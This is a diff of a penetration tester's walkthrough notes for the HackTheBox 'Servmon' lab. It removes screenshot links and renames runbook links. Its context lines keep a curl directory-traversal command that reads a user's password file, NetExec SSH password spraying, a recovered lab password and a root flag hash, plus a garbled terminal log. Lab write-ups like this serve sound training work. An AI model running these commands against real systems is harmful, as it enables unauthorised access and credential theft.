@@ -105,7 +105,6 @@ PORT      STATE SERVICE
 > ~~~
 > Why: After the full scan has returned, one targeted command fingerprints every discovered port instead of checking each interesting port in separate passes.
 
-![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/1.1nmap-allports.png>)
 SCREENSHOT: Full port scan with FTP, SSH, HTTP, and NSClient++ ports highlighted.
 
 ## 3. Service and version scan
@@ -122,7 +121,6 @@ Port 8443 identified NSClient++. Its certificate used localhost as the common na
 
 SMB signing was enabled but not required. The dynamic RPC ports were standard Windows services and were not the initial target.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 SCREENSHOT: Service scan showing anonymous FTP, the NVMS-1000 fingerprint, and NSClient++ with localhost certificate.
 
 ## 4. FTP enumeration
@@ -157,7 +155,6 @@ cat $BoxDir/loot/Nadine_Confidential.txt
 
 The note identified the exact filename and location of Nathan's password list: C:\Users\$Username2\Desktop\Passwords.txt. FTP could not read it, so the NVMS-1000 traversal became the next step.
 
-![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/8.ftp-iis-mapping.png>)
 SCREENSHOT: Confidential.txt with the password filename and Desktop location highlighted.
 
 ## 6. Confirm NVMS-1000 and search for the manual technique
@@ -204,7 +201,6 @@ The response saved a password list to loot. I did not print the passwords.
 
 Reference: [Exploit-DB 47774](https://www.exploit-db.com/exploits/47774)
 
-![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/2.3nvms-traversal.png>)
 SCREENSHOT: Traversal request with --path-as-is and the safe win.ini response visible.
 
 ## 8. Spray the SSH credentials
@@ -233,7 +229,6 @@ Do not add --no-bruteforce here. That option pairs one username with one passwor
 >
 > Why: NetExec tests the full matrix in seconds and reports the first valid SSH combination without repetitive manual login attempts.
 
-![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/3.2ssh-spray.png>)
 SCREENSHOT: NetExec spray result with the successful account line and recovered password visible in this private vault.
 
 ## 9. SSH foothold
@@ -282,7 +277,6 @@ boxset NSCPPassword $NSCPPassword
 loot cred nscp $NSCPPassword
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/5.nsclient-init-output.png>)
 SCREENSHOT: nsclient.ini with the password, localhost restriction, and external script settings highlighted. Keep the password within this private vault.
 
 ## 11. Tunnel to NSClient++
@@ -359,7 +353,6 @@ The file contained nt authority\\system, confirming SYSTEM execution.
 >
 > Why: A local proof file confirms the execution identity without adding a listener, payload transfer, or shell stability step.
 
-![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/PROOF.png>)
 SCREENSHOT: Proof file showing the command and nt authority\\system. Do not capture any flag output.
 
 ## 14. Confirm both flag paths privately
@@ -389,9 +382,9 @@ Both flag paths were confirmed. Their values are reproduced in the private secti
 
 ## 15. RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - Service Abuse]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - SeImpersonate Abuse]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - Service Abuse]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] -- technique used in this walkthrough
 
 ## 16. Collect the flags
 
@@ -457,9 +450,9 @@ rm -rf $BoxDir
 - [x] Target and local artifacts removed
 
 ## 18. Attack narrative in one page
-1. [[RUNBOOK V2/Windows - Web Enum]] and FTP enumeration exposed the management services and a useful password note.
+1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] and FTP enumeration exposed the management services and a useful password note.
 2. The file-read flaw validated the note and supplied an SSH credential.
-3. [[RUNBOOK V2/Windows - Service Abuse]] and [[RUNBOOK V2/Windows - SeImpersonate Abuse]] led from the tunneled API to a SYSTEM shell.
+3. [[OSCP/RUNBOOK V2/Windows - Service Abuse]] and [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] led from the tunneled API to a SYSTEM shell.
 
 ## Tools used
 
@@ -574,7 +567,6 @@ $ [22:18:50] netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan
 kali@kali:~/Platforms/HackTheBox/Servmon [22:12:30] $ curl -s --path-as-is "http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o $BoxDir/loot/Nathan_Passwords.txt
 cat $BoxDir/loot/Nathan_Passwords.txtcurl"http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
 netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt --no-bruteforce 2>/dev/nullprintf "nadine\nnathan\n" >
-[22:18:31] ERROR    Number provided of usernames and passwords/hashes do not match!                                              ]8;id=988515;file:///home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/connection.py\connection.py]8;;\:]8;id=429353;file:///home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/connection.py#586\586]8;;\
 kali@kali:~/Platforms/HackTheBox/Servmon [22:18:32] $ [?1h=[?2004hnetexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/nullnetexec2>/dev/null[?1l>[?2004l
 boxset Password 'L1k3B1gBut7s@W0rk'
 loot cred $Username $Password
@@ -632,12 +624,12 @@ loot flag root 7b8b0da2b3f25f54019349e9c08a1555loot
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Windows - Service Scan]]
-- [[RUNBOOK V2/Windows - Web Enum]]
-- [[RUNBOOK V2/Windows - Shell Received]]
-- [[RUNBOOK V2/Windows - Privilege Triage]]
-- [[RUNBOOK V2/Windows - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
+- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
+- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
+- [[OSCP/RUNBOOK V2/Windows - Clean Down]]
 
 ## Why this matters for OSCP
 
